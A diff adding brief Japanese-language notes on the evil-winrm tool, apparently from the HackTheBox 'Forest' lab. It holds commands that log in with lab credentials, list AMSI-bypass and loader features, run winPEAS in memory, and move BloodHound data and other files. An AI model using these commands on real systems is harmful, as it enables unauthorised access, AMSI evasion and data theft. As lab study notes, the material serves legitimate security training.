@@ -1,0 +1,35 @@
+# [evil-winrm](https://github.com/Hackplayers/evil-winrm)
+
+# 接続
+    ./evil-winrm.rb -i 10.129.1.77 -u svc-alfresco -p s3rvice
+
+# menu表示
+
+    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> menu
+
+       ,.   (   .      )               "            ,.   (   .      )       .
+      ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)
+    .; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
+    _".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
+    \_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
+     |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
+     |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
+    /_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
+            \/                               \/          \/       \/         \/
+                  By: CyberVaca, OscarAkaElvis, Laox @Hackplayers
+
+    [+] Bypass-4MSI
+    [+] Dll-Loader
+    [+] Donut-Loader
+    [+] Invoke-Binary
+
+# binaryの実行
+
+    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-Binary /opt/SharpCollection/NetFramework_4.0_x64/winPEAS.exe
+
+binary集:[sharp-collection](https://github.com/Flangvik/SharpCollection.git)
+
+# fileのダウンロード・アップロード
+
+    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20210429095327_BloodHound.zip /home/asai/audit/htb/Forest/10.129.1.77/hand/20210429095327_BloodHound.zip
+    *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload README.md
